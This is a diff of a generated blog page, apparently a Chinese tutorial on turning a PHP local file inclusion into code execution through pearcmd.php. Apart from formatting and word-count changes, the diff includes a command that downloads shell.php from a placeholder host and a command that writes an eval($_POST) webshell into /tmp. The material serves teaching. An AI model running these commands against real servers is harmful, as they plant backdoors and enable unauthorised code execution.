@@ -367,6 +367,15 @@ https://tttang.com/archive/1312/
                 </div>
                 <div class="col s5 right-align">
                     
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/php/" class="post-category">
+                                php
+                            </a>
+                        
+                    </div>
+                    
                 </div>
             </div>
 
@@ -383,7 +392,7 @@ https://tttang.com/archive/1312/
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    495
+                    483
                 </div>
                 
 
@@ -427,24 +436,24 @@ https://tttang.com/archive/1312/
 <p>pear本身是一个sh程序，它调用了<code>pearcmd.php</code>。这里忽略一些细节，只需要知道，pearcmd.php中<code>$argv</code>就是通过<code>$_SERVER[&#39;argv&#39;]</code>来获取到的。</p>
 <p>这样就通过包含<code>pearcmd.php</code>，利用<code>$_SERVER[&#39;argv&#39;]</code>来调用pear命令。</p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>我们可以利用它的下载功能下载shell文件，再去包含</p>
-<pre><code>pear install -R /tmp http://xxxxxxx/shell.php
+<pre class=" language-shell"><code class="language-shell">pear install -R /tmp http://xxxxxxx/shell.php
 -R可以指定下载文件保存的目录
 </code></pre>
-<h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><pre><code>pear -c /tmp/.lees.php -d man_dir=&lt;?=eval($_POST[0]);?&gt; -s
+<h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><pre class=" language-shell"><code class="language-shell">pear -c /tmp/.lees.php -d man_dir=<?=eval($_POST[0]);?> -s
 </code></pre>
 <p>pear命令</p>
-<pre><code># pear help options
+<pre class=" language-text"><code class="language-text"># pear help options
 Options:
      -v         increase verbosity level (default 1)
      -q         be quiet, decrease verbosity level
-     -c file    find user configuration in `file&#39;
-     -C file    find system configuration in `file&#39;
-     -d foo=bar set user config variable `foo&#39; to `bar&#39;
-     -D foo=bar set system config variable `foo&#39; to `bar&#39;
+     -c file    find user configuration in `file'
+     -C file    find system configuration in `file'
+     -d foo=bar set user config variable `foo' to `bar'
+     -D foo=bar set system config variable `foo' to `bar'
      -G         start in graphical (Gtk) mode
      -s         store user configuration
      -S         store system configuration
-     -u foo     unset `foo&#39; in the user configuration
+     -u foo     unset `foo' in the user configuration
      -h, -?     display help/usage (this message)
      -V         version information
 </code></pre>
@@ -837,7 +846,7 @@ Options:
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">19.7k</span>
+                        class="white-color">21.6k</span>
             
             
             
